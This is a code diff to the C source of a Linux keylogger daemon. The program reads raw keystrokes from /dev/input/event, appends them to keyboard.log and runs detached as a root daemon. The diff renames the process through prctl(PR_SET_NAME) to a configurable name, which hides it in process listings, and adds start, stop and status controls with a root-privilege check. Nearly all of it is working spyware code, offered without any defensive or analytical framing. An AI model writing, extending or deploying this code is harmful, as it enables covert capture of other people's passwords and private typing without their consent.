@@ -30,6 +30,7 @@
 #include <sys/types.h>
 #include <sys/stat.h>
 #include <fcntl.h>
+#include <sys/prctl.h>
 #include <linux/input.h>
 
 #include "keylogger.h"
@@ -42,8 +43,10 @@
 #define BUFFER_SIZE		32
 #endif
 
+extern char **environ;
+
+static const char *kb_log_name = DAEMON_NAME;
 static const char *kb_input_path = "/dev/input/event" EVENT_NUMBER;
-static const char *kb_log_path = "keyboard.log";
 
 static int log_fd;
 static ssize_t off = 0;
@@ -63,7 +66,7 @@ int buffer_write(const char *src, size_t len)
 	return 0;
 }
 
-static int key_logger(void)
+static int kb_log_daemon(void)
 {
 	int evt_fd;
 	size_t len;
@@ -82,7 +85,7 @@ static int key_logger(void)
 		return -1;
 	}
 
-	if ((log_fd = open(kb_log_path, O_WRONLY|O_APPEND|O_CREAT, S_IRUSR|S_IWUSR)) == -1)
+	if ((log_fd = open("keyboard.log", O_WRONLY|O_APPEND|O_CREAT, S_IRUSR|S_IWUSR)) == -1)
 	{
 		close(evt_fd);
 		free((void *) buffer);
@@ -164,7 +167,7 @@ static int key_logger(void)
 	return -1;
 }
 
-void sigterm_handler(int sig)
+static void sigterm_handler(int sig)
 {
 	int out = 0;
 
@@ -177,7 +180,7 @@ void sigterm_handler(int sig)
 	exit(out);
 }
 
-int main(void)
+static int start_kb_log(void)
 {
 	int fd;
 	pid_t pid;
@@ -193,6 +196,9 @@ int main(void)
 		return -1;
 	else if (pid > 0)
 		return 0;
+
+	if (prctl(PR_SET_NAME, kb_log_name) < 0)
+		return -1;
 
 	if ((sid = setsid()) < 0)
 		return -1;
@@ -223,5 +229,115 @@ int main(void)
 	for (fd=sysconf(_SC_OPEN_MAX); fd>=0; fd--)
 		close(fd);
 
-	return key_logger();
+	return kb_log_daemon();
+}
+
+static inline __attribute__((always_inline))
+int check_priviledges(void)
+{
+	int i, ret = -1;
+
+	if (environ != NULL)
+	{
+		i = ret = 0;
+
+		while (environ[i] != NULL)
+		{
+			if (strncmp(environ[i], "SUDO_COMMAND", 12) == 0)
+			{
+				ret = 1;
+				break;
+			}
+			else if (strncmp(environ[i], "USER=root", 9) == 0)
+			{
+				ret = 1;
+				break;
+			}
+
+			i++;
+		}
+	}
+
+	return ret;
+}
+
+int main(int argc, char *argv[])
+{
+	int ret;
+	pid_t pid;
+	FILE *pgrep;
+	char cmd[32];
+
+	if (argc < 2)
+	{
+		printf("No argument passed to program. Please, specify one of the following:  start | stop | status\n");
+		return -1;
+	}
+
+	ret = snprintf(cmd, 32, "pgrep -x %s", kb_log_name);
+
+	if (ret < 0 || ret >= 32)
+	{
+		printf("The buffer has not enough space to accommodate the specified daemon name.\n");
+		return -1;
+	}
+
+	if ((pgrep = popen(cmd, "r")) == NULL)
+	{
+		printf("Unable to check if \"%s\" daemon is running or not.\n", kb_log_name);
+		return -1;
+	}
+
+	ret = fscanf(pgrep, "%d", &pid);
+
+	pclose(pgrep);
+
+	if (strcmp(argv[1], "start") == 0)
+	{
+		if (ret == EOF)
+		{
+			ret = check_priviledges();
+
+			if (ret == 0)
+			{
+				printf("Run with higher priviledges in order to start the \"%s\" daemon.\n", kb_log_name);
+				return -1;
+			}
+
+			return start_kb_log();
+		}
+		else
+			printf("The \"%s\" daemon is already running.\n", kb_log_name);
+	}
+	else if (strcmp(argv[1], "stop") == 0)
+	{
+		if (ret == EOF)
+			printf("The \"%s\" daemon is not running.\n", kb_log_name);
+		else
+		{
+			ret = check_priviledges();
+
+			if (ret == 0)
+			{
+				printf("Run with higher priviledges in order to stop the \"%s\" daemon.\n", kb_log_name);
+				return -1;
+			}
+
+			kill(pid, SIGTERM);
+		}
+	}
+	else if (strcmp(argv[1], "status") == 0)
+	{
+		if (ret == EOF)
+			printf("The \"%s\" daemon is not running.\n", kb_log_name);
+		else
+			printf("The \"%s\" daemon is running with PID: %d\n", kb_log_name, pid);
+	}
+	else
+	{
+		printf("The argument passed must match one of the following:  start | stop | status\n");
+		return -1;
+	}
+
+	return 0;
 }
